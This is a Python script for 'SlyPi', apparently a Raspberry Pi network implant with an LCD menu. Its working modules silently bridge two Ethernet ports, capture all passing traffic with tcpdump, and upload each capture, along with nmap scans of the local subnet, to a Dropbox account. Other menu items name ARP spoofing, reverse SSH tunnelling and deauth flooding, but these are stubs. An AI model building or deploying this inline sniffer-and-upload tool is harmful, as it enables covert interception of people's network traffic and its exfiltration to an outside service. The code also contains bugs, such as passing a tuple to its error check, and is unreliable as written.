#!/usr/bin/python
import os
import sys
from time import sleep
from Adafruit_CharLCDPlate import Adafruit_CharLCDPlate
import subprocess
from subprocess import PIPE
from dbupload import upload_file #Used for Dropbox uploading
from datetime import datetime # Used the genreate the filename used in the packet capture dump

# Initialize the LCD plate.  Should auto-detect correct I2C bus.  If not,
# pass '0' for early 256 MB Model B boards or '1' for all later versions
lcd = Adafruit_CharLCDPlate(busnum = 0)
#Change thease values so that the dumped file is uploaded to your dropbox account.
dropbox_email = "a"
dropbox_password = ""

# The following are the modules which can be added the SlyPi Device.
# To add the module simply define the function below and then add the module name and function name to the modules dictonary.
# All code the module executes is to be placed in the function.
def errorCheck(error, failedMessage, succeedMessage):
    lcd.clear()
    if 'brctl: not found' in error:
        lcd.backlight(lcd.RED)
        lcd.message("Failed\nInstall brctl")
    elif len(error) > 0:
        lcd.backlight(lcd.RED)
        lcd.message(failedMessage)
        sleep(1)
    elif len(error) == 0:
        lcd.backlight(lcd.GREEN)
        lcd.message(succeedMessage)
        sleep(1)
    error = 0
        
def inlineSniffer():
    print "Inline Sniffer"
    #Counts the number of files that have been dumped
    count = 0     
    #Sets the IP address of ETH0 to 0.0.0.0 and sets the display.
    bridgeSetup = subprocess.Popen('ifconfig eth0 0.0.0.0', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot set\n ETH0 IP', 'Successfully\n Set eth0 IP')

    #Sets the IP address of ETH1 to 0.0.0.0 and sets the resulting display.
    bridgeSetup = subprocess.Popen('ifconfig eth1 0.0.0.0', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot set\n ETH1 IP', 'Successfully\n Set ETH1 IP')

    #Creates a bridge interface and sets the display.
    bridgeSetup = subprocess.Popen('brctl addbr bridge0', shell=True, stdout=PIPE, stderr=PIPE)
    output, error = bridgeSetup.communicate()
    print output
    print error
    errorCheck(error, 'Cannot add\nBridge 0', 'Successfully\nAdded bridge0')

    #Adds eth0 to the bridge and sets the display.
    bridgeSetup = subprocess.Popen('brctl addif bridge0 eth0', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot add\nETH0 to bridge0', 'Added ETH0\nto bridge0')
    print error

    #Adds ETH1 to the bridge and sets the display.
    bridgeSetup = subprocess.Popen('brctl addif bridge0 eth1', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot add\nETH1 to bridge0', 'Added ETH1\nto bridge0')
    print error

    #Assigns an IP address to the bridge using DHCP and sets the display.
    bridgeSetup = subprocess.Popen('dhclient bridge0', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot assign\nIP to bridge', 'Bridge Assigned\nIP address')
    print error

    #Starts the bridge interface and sets the display.
    bridgeSetup = subprocess.Popen('ifconfig bridge0 up', shell=True, stderr=PIPE)
    error = bridgeSetup.communicate()
    errorCheck(error, 'Cannot start\nbridge0', 'Bridge0 started\nsuccessfully')
    print error

    lcd.clear()
    lcd.backlight(lcd.GREEN)
    lcd.message("Ethernet Bridge\nSetup Successful")
    while True:
        count = count + 1
        #creates the filename used for the dump file
        fileName = datetime.now().strftime("%d-%m-%y at %H:%M")
        #Sets up the TCPDump command
        tcpDumpProcess = subprocess.Popen(["tcpdump", "-Z", "root", "-w", fileName, "-i", "bridge0", "-G", "60", "-W", "1"], stderr=PIPE)
        #Runs the TCPDump command
        error = tcpDumpProcess.communicate() 
        errorCheck(error, 'TCPDump Failed\nTo Start', 'TCPDump\nStarted')
        lcd.message("Dumping File\n" + str(count))
        #Uploads the dump file to dropbox
        upload_file(fileName,"/",fileName, dropbox_email,dropbox_password) 
        lcd.message("File" + str(count) +  "\nuploaded to Dropbox")
    
def printer():
    print "Mass Network Printer"
    
def aprSpoof():
    print "ARP Cache Poisoning"

def reverseSSH():
    print 'Reverse SSH'

def deauthFlood():
    print 'Deauth Flood'
    
def upsidedown():
    print 'Upside Down internet'
    
def nmapScanUpload():
    print 'Nmap Scan & Upload'
    nmapScan = subprocess.Popen('nmap 192.168.1.0/24 -oN nmapoutput.txt', shell=True, stdout=PIPE, stderr=PIPE)
    lcd.backlight(lcd.GREEN)
    lcd.clear()
    lcd.message("Running\nNmap Scan")
    nmapScan.communicate()
    lcd.clear()
    lcd.message("Scan\nComplete")
    sleep(1)
    lcd.clear()
    lcd.message("Uploading\nFile")
    upload_file('nmapoutput.txt',"/",'nmapoutput.txt', dropbox_email,dropbox_password)
    lcd.clear()
    lcd.message("Upload\nSuccessful")
    sleep(1)
    
def dhcpDiscover():
    print 'DHCP Discovery'

def connectivityTest():
    print 'Connectivity Test'
    #Pings google.com
    thePing = subprocess.Popen('ping -c 5 google.com', shell=True, stdout=PIPE, stderr=PIPE)
    lcd.clear()
    lcd.backlight(lcd.GREEN)
    lcd.message("Testing\nConnectivity")
    pingOut, pingErr = thePing.communicate()
    #If the ping fails ping 8.8.8.8
    lcd.clear()
    if len(pingErr) > 0:
        lcd.backlight(lcd.RED)
        thePing = subprocess.Popen('ping -c 5 8.8.8.8', shell=True, stdout=PIPE, stderr=PIPE)
        pingOut, pingErr = thePing.communicate()
        print 1
        #If pinging 8.8.8.8 fails display there is no internet connection
        if len(pingErr) > 0:
            lcd.message("No Internet\nConnection")
            print 2
        #If pinging 8.8.8.8 succeeds, display there is no DHCP service available for the SlyPi to use.
        else:
            lcd.message("No DHCP\n Available")
            print 3
    else:
        lcd.backlight(lcd.GREEN)
        lcd.message("You have\nConnectivity")


#Contains all modules which can be run on the device. The key is the displayed name on the LCD and the value is the function name
modules = {'Inline Ethernet\nSniffer': 'inlineSniffer',
            'Mass Network\nPrinter': 'printer',
             'ARP Cache\nSpoofing': 'aprSpoof',
              'Reverse SSH\nTunnel': 'reverseSSH',
               'Deauth\nFlooding': 'deauthFlood',
                'Upside-Down\nInternet': 'upsidedown',
                 'NMAP Scan\nand Upload': 'nmapScanUpload',
                  'DHCP\nDiscovery': 'dhcpDiscover',
                   'Connectivity\nTest': 'connectivityTest'}
displayText = modules.keys()
# Clears the display
lcd.clear()
# Checks if the script has been run as root.
if os.getuid() == 0:
    menuOption = 0
    lcd.backlight(lcd.BLUE)
    lcd.message("SlyPi\nPress Select")
else:
    lcd.backlight(lcd.BLUE)
    lcd.message("Be sure to\nRun as root")

#The following while loop controls the LCD menu and the control using the keypad through the menu.
while True:
    if lcd.buttonPressed(lcd.SELECT):
        sleep(0.5)
        lcd.clear()
        lcd.message(displayText[menuOption])
        while True:
            if lcd.buttonPressed(lcd.DOWN):
                menuOption = menuOption + 1
                if menuOption > len(modules) - 1:
                    menuOption = 0
                lcd.clear()
                lcd.message(displayText[menuOption])
                sleep(0.5)
            if lcd.buttonPressed(lcd.UP):
                menuOption = menuOption - 1
                if menuOption < 0:
                    menuOption = len(modules) - 1
                lcd.clear()
                lcd.message(displayText[menuOption])
                sleep(0.5)
            if lcd.buttonPressed(lcd.SELECT):
                globals().get(modules[displayText[menuOption]])()
                sleep(0.5)
                break
            if lcd.buttonPressed(lcd.LEFT):
                print "left"
                menuOption = 0
                break